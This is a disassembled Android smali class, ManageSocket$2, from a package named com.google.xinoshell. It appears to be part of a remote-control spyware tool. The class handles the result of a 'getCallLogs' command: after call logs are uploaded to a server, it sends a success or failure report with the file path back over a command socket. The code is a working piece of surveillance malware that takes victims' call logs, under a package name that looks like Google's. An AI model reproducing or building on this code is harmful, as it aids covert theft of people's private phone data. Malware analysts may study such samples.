.class Lcom/google/xinoshell/connection/ManageSocket$2;
.super Ljava/lang/Object;
.source "ManageSocket.java"

# interfaces
.implements Lcom/google/xinoshell/utils/DataUploader$UploadCallback;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/google/xinoshell/connection/ManageSocket;->getCallLogs(Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/google/xinoshell/connection/ManageSocket;

.field final synthetic val$socketId:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/google/xinoshell/connection/ManageSocket;Ljava/lang/String;)V
    .locals 0
    .param p1, "this$0"    # Lcom/google/xinoshell/connection/ManageSocket;
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010,
            0x1010
        }
        names = {
            null,
            null
        }
    .end annotation

    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 281
    iput-object p1, p0, Lcom/google/xinoshell/connection/ManageSocket$2;->this$0:Lcom/google/xinoshell/connection/ManageSocket;

    iput-object p2, p0, Lcom/google/xinoshell/connection/ManageSocket$2;->val$socketId:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onError(Ljava/lang/String;)V
    .locals 5
    .param p1, "error"    # Ljava/lang/String;

    .line 299
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 300
    .local v0, "infoContact":Lorg/json/JSONObject;
    const-string v1, "cmd"

    const-string v2, "getCallLogs"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 301
    const-string v1, "isSuccess"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 302
    const-string v1, "message"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Failed to upload call logs: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 303
    iget-object v1, p0, Lcom/google/xinoshell/connection/ManageSocket$2;->this$0:Lcom/google/xinoshell/connection/ManageSocket;

    iget-object v3, p0, Lcom/google/xinoshell/connection/ManageSocket$2;->val$socketId:Ljava/lang/String;

    invoke-virtual {v1, v3, v0, v2}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Lorg/json/JSONObject;I)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 306
    .end local v0    # "infoContact":Lorg/json/JSONObject;
    goto :goto_0

    .line 304
    :catch_0
    move-exception v0

    .line 305
    .local v0, "e":Lorg/json/JSONException;
    const-string v1, "JSONError"

    const-string v2, "Error creating JSON in onError"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 307
    .end local v0    # "e":Lorg/json/JSONException;
    :goto_0
    return-void
.end method

.method public onSuccess(Lcom/google/xinoshell/utils/DataUploader$UploadResponse;)V
    .locals 4
    .param p1, "response"    # Lcom/google/xinoshell/utils/DataUploader$UploadResponse;

    .line 285
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 286
    .local v0, "infoContact":Lorg/json/JSONObject;
    const-string v1, "cmd"

    const-string v2, "getCallLogs"

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 287
    const-string v1, "isSuccess"

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    .line 288
    const-string v1, "filePath"

    invoke-virtual {p1}, Lcom/google/xinoshell/utils/DataUploader$UploadResponse;->getPath()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 289
    const-string v1, "message"

    const-string v3, "successfully uploaded call logs on server"

    invoke-virtual {v0, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 290
    iget-object v1, p0, Lcom/google/xinoshell/connection/ManageSocket$2;->this$0:Lcom/google/xinoshell/connection/ManageSocket;

    iget-object v3, p0, Lcom/google/xinoshell/connection/ManageSocket$2;->val$socketId:Ljava/lang/String;

    invoke-virtual {v1, v3, v0, v2}, Lcom/google/xinoshell/connection/ManageSocket;->sendActionInfo(Ljava/lang/String;Lorg/json/JSONObject;I)V
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    .line 293
    .end local v0    # "infoContact":Lorg/json/JSONObject;
    goto :goto_0

    .line 291
    :catch_0
    move-exception v0

    .line 292
    .local v0, "e":Lorg/json/JSONException;
    const-string v1, "JSONError"

    const-string v2, "Error creating JSON in onSuccess"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 294
    .end local v0    # "e":Lorg/json/JSONException;
    :goto_0
    return-void
.end method
